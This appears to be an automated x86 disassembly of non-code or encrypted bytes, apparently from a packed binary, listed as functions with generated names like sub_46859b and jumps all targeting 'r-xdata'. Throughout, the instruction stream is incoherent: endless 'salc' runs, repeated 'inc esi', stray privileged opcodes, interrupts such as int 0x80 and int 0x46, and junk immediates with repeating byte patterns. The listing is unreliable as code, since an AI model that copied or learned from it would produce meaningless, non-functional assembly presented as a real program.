lds eax [ edx - 0x39b9d1b6 ]
inc esi
inc esi
adc eax 0x5e6232b9
scasd [ edi ]
xchg [ ebp + 0x46 ] al
inc esi
salc
sub al 0x29
and bh cl
adc eax [ esi + 0x203e2c1c ]
iretd
sub_46859b
adc eax [ esp + ebx - 0x30dfcfd4 ]
adc eax [ edx - 0x30df6b8b ]
adc eax [ eax - 0x50d0d3e4 ]
dec edx
inc esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x9aaf6611
je r-xdata
cmp edi [ esi + 0x46cad0b9 ]
inc esi
inc esi
retn
inc esi
salc
salc
salc
salc
dec ecx
retn 0x4c33
sub_468608
add ebx [ edx ]
push ss
int 0x80
scasb [ edi ]
fistp [ esi + 0x46 ]
inc esi
scasd [ edi ]
jno r-xdata
jbe r-xdata
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
inc esp
and [ ebp + 0x2 ] al
bound ebx [ edx - 0x51 ]
popad
test al 0xb9
mov ecx 0x80cdd6d6
scasb [ edi ]
jmp r-xdata
inc esi
inc esi
and cl ch
inc edi
int 0x6
dec edx
int 0x6
dec edx
int 0x46
int 0x46
int 0x6
pop esi
iretd
adc bl cl

sub_468633
add edi [ esi - 0x46507f51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x33
dec esi
int3
sub_46867e
xchg [ edi + 0x464642ba ] ch
pop ss
push [ esi + 0x46 ]
inc esi
inc esi
and cl ch
inc edi
int 0x6
dec edx
int 0x6
dec edx
int 0x46
int 0x46
int 0x6
pop esi
iretd
sub_4686a9
inc esi
inc esi
scasd [ edi ]
loopne r-xdata
salc
scasd [ edi ]
lahf
push edi
inc esi
inc esi
sub al 0x2b
sbb [ eax ] esp
iretd
mov ecx 0x4986c3b9
retn 0xa3c5
sub_4686b6
mov ecx 0x6202cdb9
pop esi
mov ecx 0xaf566232
in al 0xbc
mov ecx 0x4916d6b9
int1
inc ecx
push ss
and ch cl
add [ eax + 0x45 ] eax
add ah [ edx + 0x5a ]
scasd [ edi ]
popad
test al 0xb9
mov ecx 0x80cdd6d6
scasb [ edi ]
jmp r-xdata
adc bl cl

sub_4686f9
inc esi
inc esi
lds edi [ edi - 0x773bb6d2 ]
je r-xdata
salc
int 0x33
dec esi
push ss
and bh cl
or ebp esi
adc bl cl

inc esi
retn
sub_46871a
mov ecx 0x8ecbcbb9
mov ebx 0xcfafb9b9
mov [ 0xffffffffd6d6b9b9 ] eax
and bh cl
cmp edx edx
scasd [ edi ]
fwait
mov bl 0xb9
mov ecx 0xbe03cf20
scasd [ edi ]
xchg ecx eax
dec edi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x33
dec esi
push ss
and bh cl
or ebp esi
adc bl cl

sub_4687e1
inc esp
inc esi
inc esi
inc esi
mov cl 0x9e
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and ch al
jl r-xdata
push ss
int 0x80
scasb [ edi ]
pushfd
lodsb [ esi ]
mov ecx 0xb02bafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
int 0xbd
and bh cl
cmp eax [ esi - 0x46577f51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
dec ecx
retn 0x6c58
sub_4687fd
inc esi
inc esi
lds eax [ esi + 0x76f14944 ]
lds eax [ edi + 0x7054af44 ]
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov [ ecx + 0x4646468c ] 0xde62c2cb
inc esi
inc esi
inc esi
adc [ esi ] edx
int 0x80
scasb [ edi ]
pushfd
lodsb [ esi ]
mov ecx 0xb02bafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
int 0xbd
and bh cl
cmp eax [ esi - 0x46577f51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46887a
sbb ebp [ edx - 0x465a9d52 ]
mov ecx 0xc34a82c5
xchg [ ecx - 0x3e ] cl
add [ esi + 0xcdb9b9 ] bh
push ss
scasd [ edi ]
mov ecx 0xd6b9b9a1
salc
salc
salc
salc
salc
salc
salc
salc
adc [ edx + ebx ] ch
push ds
sub al 0x22
and bh cl
add ebp [ esi + 0x20342c1e ]
iretd
sub_4688ac
add ebp [ edi + ebp * 4 + 0x4646750f ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx - 0x34a9d3b6 ]
add esp [ edx + 0x466446af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
out 0x6b eax
inc esi
inc esi
scasd [ edi ]
mov al [ 0xffffffffd6b9b9bf ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ebp [ edi - 0x46466534 ]
salc
salc
salc
iretd
sub_468918
inc esi
inc esi
inc esi
scasb [ edi ]
push cs
movsb [ edi ] [ esi ]
mov ecx 0x10b916b9
and al ch
mov esi 0xa982afb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
mov dl [ esi + 0x46 ]
inc esi
lds eax [ edx - 0x9fc34a2 ]
push ss

sub_468944
and bh [ ecx + 0x1016b9b9 ]
scasd [ edi ]
loop r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x42
inc esi
jbe r-xdata
inc esi
inc esi
mov ecx 0xb9013210
or ah [ edx + 0x5e ]
dec ecx
retn
sub ch [ edx ]
push 0x22ba0381
sub ch [ edx ]
inc esi
mov ecx 0xefaf3e16
inc esi
inc esi
salc
salc
salc
salc
salc
and bh cl
adc esp edx
scasb [ edi ]
or [ edx + 0x46 ] dl
inc esi
pop ds
pop ds
sbb [ edi - 0x46465928 ] ebp
salc
salc

inc esi
xchg esi eax
inc edi
inc edi
inc esi
jne r-xdata
push ss

adc eax 0x46c6d0b9
inc esi
inc esi
iretd
sub_46895a
inc esi
inc esi
adc [ edi + 0x46467441 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
insd
inc edi
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x42
inc esi
jbe r-xdata
sub ch [ edx ]
push 0x22ba0381
sub ch [ edx ]
inc esi
mov ecx 0xefaf3e16
inc esi
inc esi
salc
salc
salc
salc
salc
and bh cl
adc esp edx
scasb [ edi ]
or [ edx + 0x46 ] dl
inc esi
pop ds
pop ds
sbb [ edi - 0x46465928 ] ebp
salc
salc

inc esi
xchg esi eax
inc edi
inc edi
inc esi
jne r-xdata
push ss

adc eax 0x46c6d0b9
inc esi
inc esi
iretd
sub_4689ac
rol [ esi + 0x7d464646 ] 0x85
scasd [ edi ]
lds edi [ ebp - 0x29294647 ]
salc
salc
salc
salc
add [ ebx ] 0x464646ba
inc esi
scasd [ edi ]
xor [ edx + 0x46 ] ch
inc esi
adc ecx ebp
stosb [ edi ]
lds ebp [ edx - 0x4dfc34b6 ]
push ss
int 0x3
dec esi
add [ ebx ] 0x2f2435b2
and eax [ ecx + 0x2a22be03 ]
sub ch [ eax - 0x7f ]
add edi [ edx + 0x462a2a22 ]
mov ecx 0xefaf3e16
inc esi
inc esi
salc
salc
salc
salc
salc
and bh cl
adc esp edx
scasb [ edi ]
or [ edx + 0x46 ] dl
inc esi
pop ds
pop ds
sbb [ edi - 0x46465928 ] ebp
salc
salc

sub_468a23
sbb edx [ esi - 0x51 ]
xor eax [ edi + 0x46 ]
inc esi
salc
salc
salc
salc
int 0x8e
scasd [ edi ]
add [ esi + eax * 2 + 0x46 ] esi
salc
salc
salc
salc
salc
stc
push 0x44
inc esi
inc esi
adc [ edi + 0x464667f9 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
add eax 0x426aaf22
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x98
and bh cl
sbb ecx [ ebp + ecx * 8 - 0x62 ]
and bh cl
sbb ecx [ edx - 0x33 ]
lahf
and bh cl
sbb ecx [ eax - 0x33 ]
sahf
and bh cl
sbb edx [ esi + 0x75 ]
popfd
and bh cl
sbb edx [ ebp + ecx * 8 - 0x67 ]
and bh cl
sbb eax [ edx ]
sub al 0x34
sbb eax 0x1bcf20
scasd [ edi ]
pop esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
cmp bh [ ecx + edi * 4 - 0x34a9d347 ]
add edx [ esi + 0x36ae1610 ]
mov esp 0x2e10b9b9
mov bh 0x5b
das
push es
mov ecx 0x464682f1
inc esi
scasb [ edi ]
pop es
dec ecx
inc esi
inc esi
push ss
mov ecx 0xedaf4e33
mov ah 0xb9
mov ecx 0xd6d6d6d6
iretd
sub_468af0
mov ecx 0x62c2cbb9
salc
inc esi
inc esi
inc esi
push ss
inc edx
inc edi
inc esi
inc esi
mov ecx 0x4646fed0
inc esi
retn
sub_468b18
inc esi
inc esi
inc esi
scasb [ edi ]
push cs
cmpsb [ esi ] [ edi ]
mov ecx 0x6202cdb9
push esi
mov ecx 0x9a6baf76
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xae11aa33
0xc5b9b9ac 0x5282
retn
sub_468b60
xchg [ edi - 0x464659cb ] ch
salc
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x54b8
sub_468b84
inc esi
inc esi
sub al 0xb9
push ss
scasd [ edi ]
add eax [ ebp + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646bed1
inc esi
retn
sub_468c1b
add [ esi + 0x46 ] 0x46
scasd [ edi ]
push esp
mov ebx 0xd6d6b9b9
salc
salc
push es
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp ebp [ esi - 0x4643a551 ]
mov ecx 0xc59ecdd6
mov ebp 0x616aafb9
inc esi
inc esi
salc
salc
salc
jecxz r-xdata
inc edx
push ebx
adc [ esi - 0x46465132 ] ebp
pop ds
pop ds
scasd [ edi ]
adc al 0x51
inc esi
inc esi
sub al 0x64
pop ds
scasd [ edi ]
outsd
inc esi
inc esi
int 0x9f
and bh cl
sbb ebp [ eax + 0x1bcf201d ]
mov dh 0x2c
xor ebx [ 0xffffffffb41bcf20 ]
sub al 0x2f
sbb eax 0xb21bcf20
int 0x99
scasd [ edi ]
add al 0x40
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and ch al
mov edi 0x59c2491a
pop esp
inc esi
inc esi
scasd [ edi ]
inc edi
pushad
inc esi
inc esi
salc
salc
jg r-xdata
retn 0x1153
cmpsb [ esi ] [ edi ]
mov ecx 0x381d6b9
mov edx 0x46464647
int 0x3
mov edx 0x858f1d18
salc
salc
salc
salc
salc
scasb [ edi ]
sbb [ esi + 0x2e10b9b9 ] bh
mov bh 0x5b
das
push es
mov ecx 0x464682f1
inc esi
scasd [ edi ]
lahf
pop ebp
inc esi
inc esi
salc
salc
salc

mov dl 0xaf
sub_468e27
mov ebx 0xb916b9b9
adc [ edx ] ah
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ edi - 0x46464d45 ] ebp
salc
salc
dec ecx
retn 0xa75f
lds edi [ esi - 0x782cb647 ]
scasd [ edi ]
shr [ edx - 0x29294647 ] 0xd6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
cld
mov ecx 0x20464653
iretd
sub_468ef8
sbb bh [ ebx - 0x60504647 ]
xchg ebx eax
mov ecx 0xc149d6b9
xchg esp eax
mov esi 0x862db9b9
dec esp
scasd [ edi ]
inc ecx
insd
inc esi
inc esi
scasb [ edi ]
mov [ 0xffffffffaf464664 ] eax
movsd [ edi ] [ esi ]
dec edi
inc esi
inc esi
salc
salc
salc
salc
salc
scasb [ edi ]
inc edi
mov al 0xb9
mov ecx 0xb9ad14af
mov ecx 0xc249d6d6
pop esp
inc ebx
inc esi
inc esi
mov ecx 0xb916ba33
xor ecx [ edx - 0x51 ]
arpl [ ecx + 0x46 ] bp
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x86c31211
dec ecx
retn 0x6647
sub_468f58
inc esi
inc esi
adc eax 0x3cb422c
0xbe03cd16 0xdcaf
imul eax [ esi + 0x46 ] 0xffffffd6
salc
push ds
sub al 0x23
sbb eax 0xb603cf20
sub al 0x34
int 0x85
and bh cl
add esi [ esi + ebx + 0x465edcaf ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xb9b233b9
adc [ edx ] esi
scasd [ edi ]
push ebp
outsd
inc esi
inc esi
adc ecx ebp
stosb [ edi ]
pop ss
adc eax 0x11b97511
adc [ esp + eax * 2 ] ebp
adc [ esp + eax * 2 ] ebp
inc esi
inc esi
inc esi
push es
mov ecx 0x10b94e33
jle r-xdata
mov dh 0x2c
xor al 0xcd
test [ eax ] esp
iretd
cmp al 0xba
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0xa01c
sub_468fd5
mov ecx 0x9af1b9b9
inc esi
inc esi
inc esi
scasd [ edi ]
pop ebx
inc esi
inc esi
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
dec ecx
les edx [ ebx + 0x51 ]
inc esi
inc esi
into
add esi esi
into
add esi [ esi - 0x3159fc32 ]
add edx [ esi - 0x3479fc32 ]
or esp [ edx - 0x7e1dfc35 ]
add esp [ edx + 0xd0b100d ]
scasd [ edi ]
push edx
mov ebx 0xd6d6b9b9
salc
salc
salc
into
add esp [ esi - 0x3169fc32 ]
add eax [ esi - 0x345df435 ]
add esp edx
add [ ebx ] 0xb100da2
or eax 0xb9bb52af
mov ecx 0xd6d6d6d6
adc [ edx + eax * 2 ] ebp
scasd [ edi ]
dec eax
inc esi
inc esi
int 0xf
jpe r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646f6d0
inc esi
adc eax 0xf2d0b911
inc esi
inc esi
inc esi
sbb [ 0x11d6858f ] ebx
jne r-xdata
adc [ esi ] dl
jge r-xdata
retn
dec esi
push ss
dec ecx
rol [ ebp + 0x46 ] 0x46
inc esi
iretd
sub_469063
ficom [ esi + eax * 2 + 0x46 ]
jg r-xdata
xor al 0xcd
and [ eax ] 0x1e5203cf
scasd [ edi ]
sub [ eax - 0x53d14647 ] 0xffffffc7
lodsb [ esi ]
cld
adc eax 0x46a6c0cf
inc esi
inc esi
scasb [ edi ]
jns r-xdata
mov edx 0x4654c1af
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x36
sbb [ esp + esi ] ebp
int 0x81
and bh cl
add edx [ edx + 0x1e ]
inc edx
mov ecx 0x5682c5b9
iretd
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646f6d0
inc esi
adc eax 0xf2d0b911
inc esi
inc esi
inc esi
sbb [ 0x11d6858f ] ebx
jne r-xdata
adc [ esi ] dl
jge r-xdata
into
add esp [ esi - 0x3169fc32 ]
add eax [ esi - 0x345df435 ]
add esp edx
add [ ebx ] 0xb100da2
or eax 0xb9bb52af
mov ecx 0xd6d6d6d6
salc
scasd [ edi ]
dec eax
inc esi
inc esi
int 0xf
jpe r-xdata
adc [ edx + eax * 2 ] ebp
retn
dec esi
push ss
dec ecx
rol [ ebp + 0x46 ] 0x46
inc esi
iretd
sub_4690a6
shl [ edx - 0x34b9b9ba ] 0x3
mov dl 0x16
add [ ebx ] 0x233533b2
xor al 0x20
add [ ebx ] 0x807475be
add edi [ esi + eax * 2 - 0x50f1ef47 ]
out dx eax
pushfd
mov ecx 0xd6d6d6b9
salc
salc
mov ecx 0xb9114e33
rcl dl 0x1
inc esi
inc esi
inc esi
iretd
sub_46914e
xchg [ ecx - 0x3e ] cl
and al 0xaf
mov ecx 0xafb975b9
inc edx
push 0xd6d64646
salc
salc
salc
int 0xbe
scasd [ edi ]
push cs
inc esi
inc esi
salc
salc
salc
salc
dec ecx
retn 0xa926
sub_4691b9
mov cl 0x61
inc esi
inc esi
scasb [ edi ]
add al 0x99
mov ecx 0x61b4afb9
inc esi
inc esi
scasb [ edi ]
push ebx
movsd [ edi ] [ esi ]
mov ecx 0x4c2d2eb9
add al 0x4
adc ch cl
mov esi 0xb99971af
mov ecx 0x6202cdd6
inc edx
int3
sub_4692b2
inc esp
inc esi
inc esi
pop ss
push ss
int 0x80
scasb [ edi ]
pop edx
mov eax [ 0xffffffffdeafb9b9 ]
xchg edi eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
and bh cl
sbb esi [ eax + 0x28af9ecd ]
arpl [ esi + 0x46 ] ax
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x2b
and bh cl
add ebx [ esi + ebx + 0x2c ]
sub [ eax ] ah
iretd
sub_4692f2
add ebx [ eax + 0x1e ]
sub al 0x68
sbb [ ebx ] ch
and bh cl
add esp [ esi - 0x33 ]
and [ eax ] 0xcf
add esp [ esi + ebx + 0x2c ]
int 0x8e
and bh cl
or esp [ edx + 0x1f ]
sub al 0x34
int 0x9f
scasd [ edi ]
or eax 0x1546464a
mov ecx 0xfbcf5210
xchg edx eax
mov ebx 0x86c3b9b9
dec ecx
retn
sub_469325
inc ebx
xchg ebx eax
mov ecx 0x1d1906b9
scasd [ edi ]
int1
dec esi
inc esi
inc esi
salc
salc
salc
adc [ esi - 0x4646581f ] ebp
xchg ebx eax
or [ edx ] esp
adc edi ecx
add [ esi - 0x52 ] bh
fbld [ edi + 0x3f2eb9b9 ]
push 0xcf11d285
add [ edx - 0x52 ] bh
int 0xa7
mov ecx 0x4ef72eb9
inc edx
mov cl 0x11
iretd
sub_46937c
add [ esi - 0x52 ] dh
sbb [ edi - 0x38d14647 ] ah
cmp eax 0xcf11657b
add [ edx ] bh
scasb [ edi ]
push ss
cmpsd [ esi ] [ edi ]
mov ecx 0xbd092eb9
cmp [ ebx - 0x51 ] cl
fbld [ ebp - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add ebx [ esi + 0x202b2c1e ]
iretd
sub_4693f0
xchg [ edi - 0x464666c5 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0x46aac0cf
inc esi
inc esi
scasb [ edi ]
mov esp [ esi + 0x7fafb9b9 ]
arpl [ esi + 0x46 ] ax
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
xchg [ edi - 0x2929297b ] cl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
mov edx 0x8f86d349
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
je r-xdata
sbb [ edi - 0x2929297b ] cl
salc
salc
scasd [ edi ]
xchg esi eax
mov ebp 0xd6d6b9b9
salc
salc
salc
push ss
add [ edx ] 0x62
jno r-xdata
cmp eax 0xcf11657b
add [ edx ] bh
scasb [ edi ]
push ss
cmpsd [ esi ] [ edi ]
mov ecx 0xbd092eb9
cmp [ ebx - 0x51 ] cl
fbld [ ebp - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add ebx [ esi + 0x202b2c1e ]
iretd
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
retn
salc
int 0x87
and bh cl
add ebx [ edx + 0x19682c1e ]
sub al 0x23
and bh cl
add ebx [ eax - 0x30df7e33 ]
add esp [ esi - 0x32c1d3e2 ]
mov dh 0x20
iretd
scasb [ edi ]
js r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jg r-xdata
mov ecx 0x4a82c5b9
scasd [ edi ]
adc ebx [ eax + 0x46 ]
inc esi
salc
salc
add al 0xaf
mov [ 0xffffffffd6464652 ] eax
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xc3
sahf
mov ebx 0x37db9b9
dec esi
dec ecx
retn 0xbe51
sub_469496
mov ecx 0x96c3cbb9
mov ebx 0xaf16b9b9
leave
pop eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xb9154a33
adc [ edx - 0x51 ] dh
in al 0xa9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
adc [ ecx ] dl
scasd [ edi ]
mov ebp 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x87
and bh cl
add ebx [ edx + 0x19682c1e ]
sub al 0x23
and bh cl
add ebx [ eax - 0x30df7e33 ]
add esp [ esi - 0x32c1d3e2 ]
mov dh 0x20
iretd
sub_469537
mov ecx 0xa3862eb9
cmp al 0xf6
adc eax 0x468ad8cf
inc esi
inc esi
scasb [ edi ]
rcr [ ecx + 0x4afb9b9 ] 0x1
mov ebp 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc

sub_46955a
add ebp [ edx + 0x50af1116 ]
mov ch 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
xchg [ ebp + 0x46 ] ebx
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_469596
arpl [ edi - 0x7ae74647 ] di
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x46
adc [ esi - 0x464656c1 ] ch
lds eax [ edx - 0x5edc51b6 ]
mov ecx 0x8930afb9
mov ecx 0xd6d6d6b9
salc
scasd [ edi ]
pop esp
mov ecx 0xd6d6b9b9
salc
salc
sub al 0x6
scasd [ edi ]
push esp
mov eax 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x86c31611
dec ecx
retn 0x5f3b
sub_469651
sahf
mov ecx 0x9603ceb9
into
add esi [ esi - 0x3459fc32 ]
or esp [ edx - 0x7e7dfc35 ]
add esp [ edx + 0xd0b100d ]
scasd [ edi ]
jae r-xdata
scasd [ edi ]
cwde
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3
mov esi 0x17a60bcb
mov ecx 0x4ecdba36
inc ebp
or ecx [ esi - 0x51 ]
mov ah 0xa1
mov ecx 0x3cbd6b9
retn 0x1610
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
int 0x9e
scasd [ edi ]
dec [ esi + 0x46 ]
inc esi
inc esi
push esi
inc esi
inc esi

sub_469695
test al 0xb9
mov ecx 0xcb5e82c5
add esi [ esi + 0x464f98af ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xdaaf422c
xchg ecx eax
mov ecx 0xd6d6d6b9
salc
sub al 0x2

sub_4696d2
add edi [ edx + 0x1caf8675 ]
mov ebx 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
leave
mov eax 0xaf1fb9b9
sbb edx [ edi - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
sub_46973c
push ecx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x4fcc
sub_4697c0
mov ecx 0x63abafb9
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
int 0x8
outsb
int 0x3
xchg edx eax
inc ebp
or ecx [ edx + 0x5f63af16 ]
inc esi
inc esi
salc
adc edi ecx
add [ esi ] dl
scasb [ edi ]
mov esp 0x2eb9b99a
or edx [ ecx + ebx * 2 + 0x14 ]
adc edi ecx
add [ edx ] dl
scasb [ edi ]
stosb [ edi ]
0x5a2eb9b9 0xfa94
iretd
sub_4697fa
adc edi ecx
add [ esi ] ah
scasb [ edi ]
cwde
0x3a2eb9b9 0x2117
sub al 0xaf
jne r-xdata
inc edx

mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x3
dec edx
jge r-xdata
mov edi 0x2ed6b9b9
inc edx
inc edi
inc esi
inc esi

scasd [ edi ]
mov ah 0xa8
mov ecx 0xd6d6d6b9
salc
salc
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
jne r-xdata
retn 0x8901
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x456a
sub_46985d
add eax esi
push ss
adc eax 0xb9b80aaf
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bl al
mov al 0x49
retn 0xacdf
sub_4698eb
xchg [ edi + 0x46464215 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_469981
or edi esi
scasd [ edi ]
jae r-xdata
shr dl 0x1
inc esi
inc esi
inc esi

inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
or ebp [ esi + 0x46614daf ]
inc esi
salc
salc
salc
scasd [ edi ]
mov edx [ ecx - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edi
adc eax 0xaf4487c5
pop ds
inc eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x464c
sub_4699ee
add eax [ edx ]
push ss
int 0x80
scasb [ edi ]
cmc
inc edx
inc esi
inc esi
pop ds
scasd [ edi ]
adc [ eax - 0x29294647 ] esp
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
jpe r-xdata
salc
salc
salc
salc
mov ecx 0x4646fed0
inc esi
retn
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add edx [ eax - 0x3950798b ]
mov edi 0xd6d6b9b9

sub_469a31
idiv [ ebx - 0x1b514647 ]
xchg esp eax
mov ecx 0xaf86c3b9
pop es
mov [ 0xffffffffd6d6b9b9 ] al
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
xchg edi eax
mov esi 0xd6d6d685
salc
salc
salc
mov ecx 0x4646fed0
inc esi
retn
sub_469a62
xchg [ ecx - 0x3e ] cl
inc edx
mov esp 0x11cbb9b9
inc eax
scasd [ edi ]
in eax 0xa8
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ eax ] dl
adc [ edi + 0x46464672 ] ch
salc
salc
salc
salc
salc
pop [ ebp - 0x2929292a ]
salc
iretd
sub_469a92
add [ edx - 0x52 ] ch
push cs
pushfd
mov ecx 0x7ba62eb9
jo r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc

iretd
sub_469abb
adc bh [ ebp - 0x50e94647 ]
sub al 0xa1
mov ecx 0x68675b9
scasd [ edi ]
sub al 0xbb
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xac7cae16
mov ecx 0x4a82c5b9
adc [ edi - 0x46465c01 ] ch
retn
sub_469b0f
inc esi
inc esi
int 0x8e
scasb [ edi ]
out dx al
push esi
inc esi
inc esi
mov ecx 0xcd5e6232
sub [ esi + 0x464645ce ] 0x1f
int 0x9
dec edx
